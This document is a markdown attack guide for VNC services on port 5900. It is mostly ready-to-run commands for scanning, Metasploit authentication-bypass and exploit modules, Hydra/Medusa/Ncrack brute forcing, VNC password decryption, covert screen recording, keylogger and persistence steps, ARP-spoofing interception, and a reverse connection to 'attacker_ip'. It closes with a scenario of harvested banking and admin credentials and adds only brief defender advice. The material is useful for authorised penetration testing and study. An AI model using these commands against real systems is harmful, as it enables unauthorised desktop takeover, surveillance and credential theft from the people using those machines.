# Port 5900 - VNC (Virtual Network Computing) - Complete Attack Guide

## 📖 Overview

**Protocol**: VNC (Virtual Network Computing)
**Ports**: 5900 (VNC), 5901-5909 (Additional displays), 5800 (VNC over HTTP)
**Transport**: TCP
**Encryption**: None (by default), can tunnel through SSH
**Authentication**: Password, None (if misconfigured)

## 🎯 Attack Objectives

- **No Authentication Bypass**: Access VNC without password
- **Password Brute Force**: Crack VNC passwords
- **Screen Viewing**: Watch user activity
- **Remote Control**: Take over desktop
- **Credential Theft**: Steal passwords entered by user
- **Man-in-the-Middle**: Intercept VNC traffic

## 🔍 Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect VNC Service**
```bash
# Quick scan
nmap -p 5900,5901,5902,5903,5800 192.168.1.100

# Service version
nmap -p 5900-5910 -sV 192.168.1.100

# VNC scripts
nmap -p 5900 --script vnc-* 192.168.1.100

# Network-wide discovery
nmap -p 5900 192.168.1.0/24 --open

# Scan common VNC ports
nmap -p 5800,5900-5910 192.168.1.0/24 --open
```

**1.2 VNC Information Gathering**
```bash
# Get VNC server info
nmap -p 5900 --script vnc-info 192.168.1.100

# Check authentication
nmap -p 5900 --script vnc-info,vnc-title 192.168.1.100

# Using vncviewer
vncviewer -list 192.168.1.100:5900
```

**1.3 Check for No Authentication**
```bash
# Test connection without password
vncviewer 192.168.1.100:5900

# Using nmap
nmap -p 5900 --script realvnc-auth-bypass 192.168.1.100

# Metasploit
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 192.168.1.100
run
```

### Phase 2: Authentication Bypass

**2.1 No Authentication**
```bash
# If VNC configured with no password
vncviewer 192.168.1.100:5900

# RealVNC bypass (some versions)
nmap -p 5900 --script realvnc-auth-bypass 192.168.1.100

# Ultra VNC MS Logon bypass
use auxiliary/admin/vnc/realvnc_41_bypass
set RHOST 192.168.1.100
exploit
```

**2.2 VNC Authentication Bypass Exploits**
```bash
# RealVNC 4.1.0 and 4.1.1 authentication bypass
use auxiliary/admin/vnc/realvnc_41_bypass
set RHOST 192.168.1.100
set RPORT 5900
exploit

# UltraVNC authentication bypass
# Connect then send crafted packets
```

### Phase 3: Password Attacks

**3.1 Brute Force VNC Password**

**Using Hydra**:
```bash
# Basic brute force
hydra -P /usr/share/wordlists/rockyou.txt vnc://192.168.1.100

# VNC on custom port
hydra -P passwords.txt vnc://192.168.1.100:5901

# Verbose mode
hydra -P passwords.txt vnc://192.168.1.100 -V

# Save results
hydra -P passwords.txt vnc://192.168.1.100 -o vnc_results.txt

# Limit threads (VNC has rate limiting)
hydra -P passwords.txt vnc://192.168.1.100 -t 1 -w 3
```

**Using Medusa**:
```bash
medusa -h 192.168.1.100 -P passwords.txt -M vnc
medusa -h 192.168.1.100 -p password -M vnc -n 5900
```

**Using Ncrack**:
```bash
ncrack -p 5900 -P passwords.txt 192.168.1.100
ncrack -p 5900 --user ignored -P passwords.txt 192.168.1.100
```

**Using Metasploit**:
```bash
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.1.100
set PASS_FILE /usr/share/wordlists/metasploit/vnc_passwords.txt
set THREADS 1
set STOP_ON_SUCCESS true
run
```

**Using Nmap**:
```bash
nmap -p 5900 --script vnc-brute --script-args passdb=passwords.txt 192.168.1.100
```

**3.2 VNC Password Cracking (Offline)**
```bash
# If you have VNC password file

# VNC stores passwords encrypted in registry/config
# Windows: HKEY_CURRENT_USER\Software\RealVNC\WinVNC4\Password
# Linux: ~/.vnc/passwd

# Decrypt VNC password
vncpwd <encrypted_password>

# Using vncpasswd.py
python vncpasswd.py -d <encrypted_hex>

# John the Ripper (if you have passwd file)
john --format=vnc vnc_passwd_file
```

**3.3 Common VNC Default Passwords**
```bash
# Common defaults
[blank]
password
12345678
vnc
admin
server
root
default

# Automated testing
for pass in "" "password" "12345678" "vnc" "admin"; do
  vncviewer 192.168.1.100:5900 -passwd <(echo -n "$pass" | vncpasswd -f)
done
```

### Phase 4: Successful Connection

**4.1 Connect with vncviewer**
```bash
# Linux - vncviewer
vncviewer 192.168.1.100:5900

# With password
vncviewer 192.168.1.100:5900 -passwd password.txt

# View only (no control)
vncviewer 192.168.1.100:5900 -viewonly

# Full screen
vncviewer 192.168.1.100:5900 -fullscreen

# Specify quality
vncviewer 192.168.1.100:5900 -quality 0  # Low quality, faster
```

**4.2 Connect with remmina (GUI)**
```bash
remmina -c vnc://192.168.1.100:5900
```

**4.3 Connect via Browser (if VNC over HTTP enabled)**
```bash
# Port 5800 typically
firefox http://192.168.1.100:5800
```

**4.4 Metasploit VNC Session**
```bash
# Connect with Metasploit
use auxiliary/server/capture/vnc
set SRVPORT 5900
run

# Or inject VNC
use post/windows/manage/vnc
set SESSION 1
run
```

### Phase 5: Post-Exploitation

**5.1 Screen Recording**
```bash
# Record VNC session
vncsnapshot -passwd password.txt 192.168.1.100:5900 screenshot.jpg

# Continuous recording
while true; do
  vncsnapshot 192.168.1.100:5900 screenshot_$(date +%s).jpg
  sleep 5
done

# Video recording
ffmpeg -f x11grab -framerate 25 -video_size 1920x1080 -i :0.0+0,0 vnc_recording.mp4
```

**5.2 Credential Harvesting**
```bash
# Watch for user typing passwords
# They appear on screen

# Keylogger injection (if you have control)
# Type commands to install keylogger
# Windows: powershell script
# Linux: xinput, xdotool
```

**5.3 File Access**
```bash
# VNC has file transfer capability (some versions)
# RealVNC, TightVNC support this

# Upload file
vncviewer -filetransfer 192.168.1.100:5900

# Or manually via GUI
# Use file manager on remote desktop
```

**5.4 Persistence**
```bash
# If you have VNC control, establish persistence

# Windows:
# 1. Create new admin user via GUI
# 2. Enable RDP
# 3. Install backdoor

# Linux:
# 1. Open terminal
# 2. Add SSH key
# 3. Create cron job
```

### Phase 6: Man-in-the-Middle

**6.1 VNC Traffic Interception**
```bash
# VNC traffic is unencrypted by default
# Can intercept and view

# Using Ettercap
ettercap -T -i eth0 -M arp /// ///

# Using Wireshark
wireshark -i eth0 -f "tcp port 5900"

# Extract images from traffic
# VNC sends screen updates as RFB (Remote Framebuffer)
```

**6.2 VNC Relay Attack**
```bash
# Position yourself as MITM
# Relay VNC traffic
# Can inject keystrokes or mouse movements

# Using vnc_mitm.py scripts (custom)
# Intercept authentication and session
```

### Phase 7: Exploitation

**7.1 Known VNC Vulnerabilities**
```bash
# RealVNC 4.1.0/4.1.1 - Authentication Bypass
use auxiliary/admin/vnc/realvnc_41_bypass
set RHOST 192.168.1.100
exploit

# UltraVNC 1.0.2 - Client BO
use exploit/windows/vnc/ultravnc_client
set RHOST 192.168.1.100
exploit

# VNC keyboard injection attacks
# If server allows, inject keystrokes
```

**7.2 Reverse VNC**
```bash
# Some VNC servers can "reverse connect"
# Server connects to viewer instead

# Setup VNC viewer in listening mode
vncviewer -listen 5500

# Social engineer target to connect
# Or if you compromise system, run:
vncviewer -connect attacker_ip:5500
```

## 🛡️ Bypass Techniques

### Bypassing Authentication

**Method 1: No Auth Misconfiguration**
```bash
# Many VNC servers accidentally have no password set
vncviewer 192.168.1.100:5900
```

**Method 2: Known Exploits**
```bash
# RealVNC 4.1.0/4.1.1
use auxiliary/admin/vnc/realvnc_41_bypass
```

**Method 3: Stolen Password Files**
```bash
# If you have filesystem access
# Windows: HKEY_CURRENT_USER\Software\RealVNC\WinVNC4\Password
# Linux: ~/.vnc/passwd

# Decrypt
vncpwd <encrypted_password>
```

### Bypassing Firewall

```bash
# SSH tunnel
ssh -L 5901:192.168.1.100:5900 user@jumphost
vncviewer localhost:5901

# VNC over HTTP (if enabled)
firefox http://192.168.1.100:5800
```

### Bypassing Rate Limiting

```bash
# VNC blocks after ~5 failed attempts
# Wait 10 seconds between attempts

hydra -P passwords.txt vnc://192.168.1.100 -t 1 -w 10
```

## 📊 Information Extraction

**What to Look For**:
```bash
# Opened windows and applications
# Browser history and saved passwords
# Files on desktop
# Email clients
# Database clients (credentials visible)
# Terminal sessions
# IDE projects
# Credentials in files
```

## 🔐 Security Recommendations

**For Defenders**:
1. **Strong Passwords** - Use complex VNC passwords
2. **SSH Tunneling** - Always tunnel VNC over SSH
3. **Firewall** - Block VNC ports from internet
4. **Authentication** - Never run without password
5. **Update VNC** - Patch known vulnerabilities
6. **View-Only** - Use view-only mode when possible
7. **IP Whitelisting** - Only allow specific IPs
8. **Alternative** - Use RDP or TeamViewer instead
9. **Encrypted VNC** - Use VNC variants with encryption
10. **Monitor Connections** - Log all VNC access

## ⚠️ Common Mistakes

**Attacker Mistakes**:
1. Too aggressive brute force - Triggers lockout
2. Not checking for no-auth first
3. Not recording sessions
4. Forgetting alternate ports (5901-5909)

**Defender Mistakes**:
1. No password set - Most critical
2. VNC on internet - Easy target
3. Default ports - Easy to find
4. No encryption - Traffic visible
5. Old VNC versions - Known exploits
6. No logging - Can't detect attacks

## 🎯 Practical Attack Scenario

```bash
# Discovery
nmap -p 5900-5910 192.168.1.0/24 --open
# Found: 192.168.1.50:5900

# Check authentication
nmap -p 5900 --script vnc-info 192.168.1.50
# Result: Authentication required

# Test for no password
vncviewer 192.168.1.50:5900
# Failed

# Brute force
hydra -P top100.txt vnc://192.168.1.50 -t 1 -w 10
# SUCCESS: password

# Connect
vncviewer 192.168.1.50:5900
# Entered password: "password"
# Connected!

# See user desktop
# User is logged into banking site
# Credentials visible on screen
# User types admin password in terminal

# Captured:
# - Banking credentials
# - Admin password
# - SSH keys visible in terminal
# - Email passwords

# Establish persistence
# Used GUI to create new admin user
# Full system compromise!
```

## 📚 Tools Summary

**Best Tool for Each Task**:
- **Discovery**: Nmap
- **Authentication Bypass**: Metasploit
- **Brute Force**: Hydra (slow), Ncrack
- **Connection**: vncviewer, remmina
- **Password Cracking**: vncpwd, John
- **MITM**: Ettercap, Wireshark

## 🔗 Related Attacks

- **Port 3389 (RDP)**: Similar remote desktop
- **Port 22 (SSH)**: Tunnel VNC over SSH
- **Port 5800**: VNC over HTTP
- **Port 5901-5909**: Additional VNC displays

---

**Last Updated**: 2026-06-16
